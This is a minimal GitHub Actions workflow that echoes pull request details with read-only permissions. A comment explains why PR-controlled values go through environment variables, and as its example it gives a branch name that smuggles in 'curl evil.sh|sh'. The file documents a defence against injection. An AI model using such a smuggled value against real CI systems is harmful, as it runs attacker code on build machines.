# Trivial pipeline (step 1): proves that a pull request to main triggers a
# workflow and that its result appears on the PR. It does not run code-guard yet.
name: code-guard

on:
  pull_request:
    branches: [main]
    # opened = PR created, synchronize = new commits pushed, reopened = PR reopened
    types: [opened, synchronize, reopened]

# The job only prints messages: it needs no write access to the repository
permissions:
  contents: read

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - name: Say hello
        # Values chosen by the PR author (like the branch name) go through env
        # variables, never directly into the script: a branch named
        # 'x";curl evil.sh|sh;"' would otherwise be executed as shell code.
        env:
          EVENT: ${{ github.event_name }}
          ACTION: ${{ github.event.action }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
          HEAD_REF: ${{ github.head_ref }}
          BASE_REF: ${{ github.base_ref }}
          SHA: ${{ github.sha }}
        run: |
          echo "code-guard: pipeline triggered"
          echo "Event: $EVENT ($ACTION)"
          echo "PR #$PR_NUMBER: $HEAD_REF -> $BASE_REF"
          echo "Commit tested: $SHA"
